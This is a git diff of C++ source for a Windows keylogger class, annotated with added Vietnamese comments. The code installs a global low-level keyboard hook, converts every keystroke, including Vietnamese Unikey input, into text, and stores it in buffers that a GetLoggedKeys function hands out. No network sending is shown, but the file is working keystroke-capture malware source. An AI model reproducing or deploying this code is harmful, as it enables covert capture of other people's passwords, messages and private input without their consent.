@@ -2,8 +2,10 @@
 #include <iostream>
 #include <sstream>
 
+// Con trỏ toàn cục để hàm static KeyboardProc có thể truy cập vào instance của class
 Keylogger* g_KeyloggerInstance = nullptr;
 
+// --- Constructor: Khởi tạo các giá trị mặc định và gán instance toàn cục ---
 Keylogger::Keylogger()
     : _isRunning(false), _hook(NULL), _threadId(0),
     _detectedMode("Auto-Detect"),
@@ -13,29 +15,41 @@ Keylogger::Keylogger()
     g_KeyloggerInstance = this;
 }
 
+// --- Destructor: Đảm bảo dừng luồng và gỡ Hook trước khi hủy đối tượng ---
 Keylogger::~Keylogger() {
     StopKeyLogging();
     g_KeyloggerInstance = nullptr;
 }
 
+// --- Callback Static: Hàm cầu nối nhận sự kiện từ Windows và chuyển cho ProcessKey ---
 LRESULT CALLBACK Keylogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+    // nCode >= 0: Có sự kiện xử lý được
+    // wParam == WM_KEYDOWN: Chỉ bắt sự kiện nhấn phím xuống
     if (nCode >= 0 && wParam == WM_KEYDOWN) {
         KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;
         if (g_KeyloggerInstance) {
+            // Chuyển tiếp mã phím, mã quét và cờ trạng thái vào hàm xử lý chính
             g_KeyloggerInstance->ProcessKey(pKey->vkCode, pKey->scanCode, pKey->flags);
         }
     }
+    // CallNextHookEx: Bắt buộc gọi để các ứng dụng khác vẫn nhận được phím
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
+// --- Hàm tiện ích: Xóa ký tự UTF-8 cuối cùng (xử lý byte đa luồng) ---
+// UTF-8 có thể dùng 1-4 byte cho 1 ký tự. Hàm này xóa đúng toàn bộ byte của ký tự cuối.
 void PopLastUtf8Char(std::string& str) {
     if (str.empty()) return;
+    // Nếu byte cuối là ASCII (0xxxxxxx), xóa bình thường
     if ((str.back() & 0x80) == 0) { str.pop_back(); return; }
+    // Nếu là byte tiếp theo (10xxxxxx), xóa lùi cho đến khi gặp byte đầu (11xxxxxx)
     while (!str.empty() && (str.back() & 0xC0) == 0x80) { str.pop_back(); }
+    // Xóa nốt byte đầu của ký tự đa byte
     if (!str.empty()) str.pop_back();
 }
 
 // --- HÀM MAP PHÍM ULTRA FULL (KHÔNG BỎ SÓT PHÍM NÀO) ---
+// Chuyển đổi mã phím ảo (Virtual Key) thành chuỗi hiển thị (Log thô)
 std::string Keylogger::MapVkToRawString(DWORD vkCode, bool isShift, bool isCaps) {
     bool isUpper = isShift ^ isCaps;
 
@@ -59,7 +73,7 @@ std::string Keylogger::MapVkToRawString(DWORD vkCode, bool isShift, bool isCaps)
 
     // 4. FULL DANH SÁCH PHÍM CHỨC NĂNG (THEO CHUẨN MICROSOFT)
     switch (vkCode) {
-        // --- Chuột (Hiếm gặp nhưng cứ thêm) ---
+        // --- Chuột ---
     case VK_LBUTTON:  return "[MOUSE_L]";
     case VK_RBUTTON:  return "[MOUSE_R]";
     case VK_CANCEL:   return "[BREAK]";
@@ -124,7 +138,7 @@ std::string Keylogger::MapVkToRawString(DWORD vkCode, bool isShift, bool isCaps)
     case VK_DIVIDE:   return "/";
     case VK_NUMLOCK:  return "[NUMLOCK]";
 
-        // --- MULTIMEDIA (Fix lỗi 0xAD, 0xB3...) ---
+        // --- MULTIMEDIA  ---
     case VK_VOLUME_MUTE:     return "[MUTE]";
     case VK_VOLUME_DOWN:     return "[VOL-]";
     case VK_VOLUME_UP:       return "[VOL+]";
@@ -149,22 +163,22 @@ std::string Keylogger::MapVkToRawString(DWORD vkCode, bool isShift, bool isCaps)
     case VK_LAUNCH_APP2:     return "[APP2]";
 
         // --- DẤU CÂU (OEM) ---
-    case VK_OEM_1:      return isShift ? ":" : ";";
-    case VK_OEM_PLUS:   return isShift ? "+" : "=";
-    case VK_OEM_COMMA:  return isShift ? "<" : ",";
-    case VK_OEM_MINUS:  return isShift ? "_" : "-";
-    case VK_OEM_PERIOD: return isShift ? ">" : ".";
-    case VK_OEM_2:      return isShift ? "?" : "/";
-    case VK_OEM_3:      return isShift ? "~" : "`";
-    case VK_OEM_4:      return isShift ? "{" : "[";
-    case VK_OEM_5:      return isShift ? "|" : "\\";
-    case VK_OEM_6:      return isShift ? "}" : "]";
-    case VK_OEM_7:      return isShift ? "\"" : "'";
-    case VK_OEM_8:      return "[OEM8]"; // Phím lạ tùy bàn phím
-    case VK_OEM_102:    return isShift ? ">" : "<"; // Phím <> cạnh Shift trái (ISO)
-    case VK_OEM_CLEAR:  return "[CLEAR]";
+    case VK_OEM_1:       return isShift ? ":" : ";";
+    case VK_OEM_PLUS:    return isShift ? "+" : "=";
+    case VK_OEM_COMMA:   return isShift ? "<" : ",";
+    case VK_OEM_MINUS:   return isShift ? "_" : "-";
+    case VK_OEM_PERIOD:  return isShift ? ">" : ".";
+    case VK_OEM_2:       return isShift ? "?" : "/";
+    case VK_OEM_3:       return isShift ? "~" : "`";
+    case VK_OEM_4:       return isShift ? "{" : "[";
+    case VK_OEM_5:       return isShift ? "|" : "\\";
+    case VK_OEM_6:       return isShift ? "}" : "]";
+    case VK_OEM_7:       return isShift ? "\"" : "'";
+    case VK_OEM_8:       return "[OEM8]"; // Phím lạ tùy bàn phím
+    case VK_OEM_102:     return isShift ? ">" : "<"; // Phím <> cạnh Shift trái (ISO)
+    case VK_OEM_CLEAR:   return "[CLEAR]";
 
-        // --- IME (Bộ gõ Nhật/Hàn/Trung - Có thể xuất hiện nếu máy cài ngôn ngữ này) ---
+        // --- IME (Bộ gõ Nhật/Hàn/Trung) ---
     case VK_KANA:     return "[IME_KANA]";
     case VK_JUNJA:    return "[IME_JUNJA]";
     case VK_FINAL:    return "[IME_FINAL]";
@@ -185,7 +199,7 @@ std::string Keylogger::MapVkToRawString(DWORD vkCode, bool isShift, bool isCaps)
     case VK_ZOOM:       return "[ZOOM]";
     case VK_PA1:        return "[PA1]";
 
-    case 0xFF: return ""; // Bỏ qua, không in ra cho đỡ rối
+    case 0xFF: return ""; // Bỏ qua
     }
 
     // Nếu vẫn không có trong danh sách trên thì in Hex để debug
@@ -194,6 +208,7 @@ std::string Keylogger::MapVkToRawString(DWORD vkCode, bool isShift, bool isCaps)
     return std::string(buff);
 }
 
+// --- Phân tích trạng thái bộ gõ (Unikey/System IME) ---
 void Keylogger::AnalyzeInputMethod(DWORD vkCode, bool isInjected) {
     HKL currentLayout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL));
 
@@ -227,20 +242,22 @@ void Keylogger::AnalyzeInputMethod(DWORD vkCode, bool isInjected) {
         _lastPhysicalKey = vkCode;
     }
 }
+
+// --- Hàm xử lý chính: Chuyển đổi mã phím, xử lý logic bộ gõ và lưu log ---
 void Keylogger::ProcessKey(DWORD vkCode, DWORD scanCode, DWORD flags) {
     std::lock_guard<std::mutex> lock(_mutex);
     bool isInjected = (flags & LLKHF_INJECTED) != 0;
 
     AnalyzeInputMethod(vkCode, isInjected);
 
-    // [RAW BUFFER] 
+    // [RAW BUFFER] - Ghi lại tất cả phím thật (không phải phím ảo do Unikey tạo)
     if (!isInjected) {
         bool isShift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
         bool isCaps = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
         _rawLogBuffer += MapVkToRawString(vkCode, isShift, isCaps);
     }
 
-    // Xử lý phím BACKSPACE
+    // Xử lý phím BACKSPACE (Unikey thường gửi Backspace để sửa dấu)
     if (vkCode == VK_BACK) {
         PopLastUtf8Char(_finalLogBuffer);
 
@@ -260,7 +277,8 @@ void Keylogger::ProcessKey(DWORD vkCode, DWORD scanCode, DWORD flags) {
 
     // Chuyển đổi sang Unicode
     BYTE keyboardState[256];
-    GetKeyboardState(keyboardState);
+    GetKeyboardState(keyboardState); // Lấy trạng thái bàn phím hiện tại
+    // Force cập nhật trạng thái Shift và CapsLock để ToUnicode hoạt động đúng
     if (GetKeyState(VK_SHIFT) & 0x8000) keyboardState[VK_SHIFT] = 0x80;
     if (GetKeyState(VK_CAPITAL) & 0x0001) keyboardState[VK_CAPITAL] = 0x01;
 
@@ -272,6 +290,8 @@ void Keylogger::ProcessKey(DWORD vkCode, DWORD scanCode, DWORD flags) {
     // Nếu chuyển đổi thành công ra ký tự văn bản
     if (WideCharToMultiByte(CP_UTF8, 0, buffer, 1, utf8Buffer, 16, NULL, NULL) > 0) {
 
+        // Nếu trước đó Unikey vừa xóa ký tự (để bỏ dấu), ta cần xóa thêm 1 lần nữa trong log
+        // để đồng bộ với màn hình hiển thị
         if (isInjected && _lastWasInjectedBackspace) {
             PopLastUtf8Char(_finalLogBuffer);
         }
@@ -290,6 +310,7 @@ void Keylogger::ProcessKey(DWORD vkCode, DWORD scanCode, DWORD flags) {
 
 void Keylogger::RunHookLoop() {
     _threadId = GetCurrentThreadId();
+    // Cài đặt Hook bàn phím, chạy vòng lặp nhận tin nhắn hệ thống và gỡ Hook khi nhận lệnh dừng.
     _hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
     if (!_hook) return;
     MSG msg;
@@ -306,17 +327,20 @@ void Keylogger::StartKeyLogging() {
     if (_isRunning) return;
     _isRunning = true;
     _rawLogBuffer = ""; _finalLogBuffer = "";
+    // Tạo một luồng (thread) riêng biệt để chạy vòng lặp bắt phím mà không làm đơ chương trình chính.
     _loggerThread = std::thread(&Keylogger::RunHookLoop, this);
 }
 
 void Keylogger::StopKeyLogging() {
     if (!_isRunning) return;
     _isRunning = false;
+    // Gửi tin nhắn WM_QUIT vào luồng đang chạy để ngắt vòng lặp và chờ luồng đó tắt hoàn toàn (join).
     if (_threadId != 0) PostThreadMessage(_threadId, WM_QUIT, 0, 0);
     if (_loggerThread.joinable()) _loggerThread.join();
 }
 
 std::string Keylogger::GetLoggedKeys() {
+    // Dùng Mutex khóa luồng để trích xuất dữ liệu an toàn, sau đó xóa bộ đệm ngay lập tức.
     std::lock_guard<std::mutex> lock(_mutex);
     std::stringstream ss;
     ss << "MODE: " << _detectedMode << "\n";
